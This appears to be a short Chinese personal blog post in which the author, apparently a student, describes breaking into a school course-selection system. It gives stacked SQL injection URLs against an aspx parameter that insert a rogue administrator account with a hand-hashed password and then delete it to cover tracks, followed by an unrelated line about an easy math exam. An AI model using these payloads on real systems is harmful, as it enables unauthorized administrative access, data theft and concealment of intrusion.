怎样脱裤选课系统？写POST一个一个扒？还是SQL注入？SQL不但方便，而且抓得全。

特别登陆界面因为出现过一次问题，被MD5了，普通登录界面没有MD5，但是注进去都是SQL语法错误。于是决定改数据库里的管理员。

先用自己的账号登入，点开一个aspx，发现传过去的参数是查询指令：

```
http://xxx/xx.aspx?xxx=xx
```

问号后面的就是查询指令。然后试出来管理员库叫admin，注入之：

```SQL
http://xxx/xx.aspx?xxx='; insert into admin(admin_name, admin_pwd) VALUES ('xxx', 'xxx')--
```

注意，注进去的value要手动md5一下，因为服务器正常地添加管理员会md5，登陆界面也会md5。

完事之后清理现场：

```SQL
http://xxx/xx.aspx?xxx='; delete from admin where admin_name = 'xxx'--
```

--------------------------------------------------------------

今天的数学实在水。放水放得飞流直下三千尺。
